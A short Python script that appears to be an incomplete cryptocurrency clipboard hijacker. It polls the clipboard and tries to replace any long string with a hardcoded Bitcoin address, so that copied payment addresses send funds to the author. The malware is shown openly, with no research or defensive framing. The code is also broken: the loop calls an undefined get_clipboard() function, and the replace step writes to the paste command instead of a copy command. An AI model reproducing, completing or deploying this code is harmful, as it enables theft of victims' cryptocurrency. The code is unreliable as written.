import re
import sys
import subprocess
from Tkinter import Tk

#User Tkinter for Windows
#re = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', '1BoatSLRHtKNngkdXEeobR76b53LETtpyT')

destination_address = '1BoatSLRHtKNngkdXEeobR76b53LETtpyT'

def clipboard():
    x = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
    data = str(x.stdout.read())
    if len(data) > 33:
        switch(data)

def switch(data):
    x = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
    x.stdin.write(destination_address)
    x.stdin.close()

while True:
    get_clipboard()
